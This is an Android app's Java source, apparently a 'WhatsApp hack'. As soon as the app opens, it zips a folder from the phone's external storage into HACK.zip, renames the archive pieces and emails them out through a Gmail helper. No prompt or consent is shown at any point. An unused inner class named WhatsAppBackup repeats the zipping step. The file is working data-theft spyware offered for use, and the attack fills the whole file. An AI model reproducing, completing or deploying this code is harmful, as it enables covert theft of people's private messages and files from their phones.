package com.sunny.whatsapphack;

import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;

import com.sunny.Mail.GMail;
import com.sunny.zipper.Zipper;

public class MainActivity extends Activity {

	private final String folderName = "Songs";
	private final String TAG = getClass().getSimpleName();
	public static final String SD_CARD_PATH=Environment.getExternalStorageDirectory().getAbsolutePath();
	public static final File SD_CARD_FILE=Environment.getExternalStorageDirectory();
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		String[] requiredFolder = SD_CARD_FILE.list(new FilenameFilter() {

					@Override
					public boolean accept(File dir, String filename) {
						// TODO Auto-generated method stub
						return filename.toLowerCase().equalsIgnoreCase(
								folderName.toLowerCase());
					}
				});

		Zipper fileZipper = new Zipper();
		boolean result = fileZipper.zipFolder(
				SD_CARD_PATH + "/"
						+ requiredFolder[0],
						SD_CARD_PATH + "/HACK.zip", 20);
		if (result) {
			
			new AsyncTask<Void, Void, Void>(){
				protected Void doInBackground(Void[] params) {
					
					String[] filesAttach=MainActivity.SD_CARD_FILE.list(new FilenameFilter() {
						
						@Override
						public boolean accept(File dir, String filename) {
							// TODO Auto-generated method stub
							  return filename.contains("HACK");
						}
					});
					
					for (int i = 0; i < filesAttach.length; i++) {
						String newFileName=SD_CARD_FILE+"/"+"wh"+i;
						String fileName = filesAttach[i];
						new File(SD_CARD_PATH+"/"+fileName).renameTo(new File(newFileName));
						new GMail().sendMail(newFileName,"zip"+i,String.valueOf(filesAttach.length));
						
					}
					
					
					
					return null;
					
				};
			}.execute();
			
			
		} else {

		}

		Log.i(TAG, "------File Name is " + requiredFolder[0]);

		// Environment.getExternalStorageDirectory().getAbsolutePath()+File.separator+requiredFolder[0]
	}

	private class WhatsAppBackup extends AsyncTask<Void, Void, Void> {

		@Override
		protected Void doInBackground(Void... params) {

			String[] requiredFolder = Environment.getExternalStorageDirectory()
					.list(new FilenameFilter() {

						@Override
						public boolean accept(File dir, String filename) {
							// TODO Auto-generated method stub
							return filename.toLowerCase().equalsIgnoreCase(
									folderName.toLowerCase());
						}
					});

			Zipper fileZipper = new Zipper();

			fileZipper
					.zipFolder(Environment.getExternalStorageDirectory()
							+ "/" + requiredFolder[0],
							Environment.getExternalStorageDirectory()
									+ "/HACK.zip", 23);

			return null;
		}
	}

}
